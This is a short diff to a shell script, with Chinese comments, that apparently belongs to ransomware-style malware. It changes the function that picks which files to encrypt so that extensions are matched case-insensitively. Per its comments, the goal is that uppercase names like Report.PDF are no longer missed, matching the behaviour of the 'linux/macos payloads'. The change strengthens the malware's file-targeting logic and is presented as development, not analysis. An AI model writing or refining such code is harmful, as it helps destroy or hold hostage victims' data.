@@ -66,6 +66,9 @@ fmt_bytes(){
 # 判断文件是否为加密目标
 is_target(){
     _e="${1##*.}"
+    # 大小写不敏感：EXTS 全小写，但真实文件可能是 Report.PDF / Photo.JPG。
+    # 此前严格相等，大写扩展名永不被加密（与 linux/macos 载荷的 e.lower() 行为不一致）。
+    _e=$(printf '%s' "$_e" | tr 'A-Z' 'a-z')
     for _x in $EXTS; do
         [ "$_e" = "$_x" ] && return 0
     done
